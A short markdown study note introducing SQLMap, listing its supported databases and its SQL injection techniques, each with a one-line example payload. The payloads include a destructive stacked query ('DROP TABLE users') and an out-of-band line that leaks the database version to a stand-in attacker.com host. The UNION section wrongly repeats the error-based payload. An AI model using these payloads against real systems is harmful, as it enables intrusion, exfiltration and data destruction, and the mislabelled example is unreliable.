---
title: a-intro
draft: false
tags:
---
SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types.

## Supported Databases

|   |   |   |   |
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`|

## Techniques Used

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

### Boolean-based Blind SQLi

```sql
AND 1=1
```

Differentiates `TRUE` from `FALSE` query results.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
    
- `FALSE` results are based on responses having substantial differences from the regular server response.

### Error-based SQLi

```sql
AND GTID_SUBSET(@@version,0)
```

### UNION query-based

```sql
AND GTID_SUBSET(@@version,0)
```

### Stacked queries

```sql
; DROP TABLE users
```

### Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

### Inline queries

```sql
SELECT (SELECT @@version) from
```


### Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

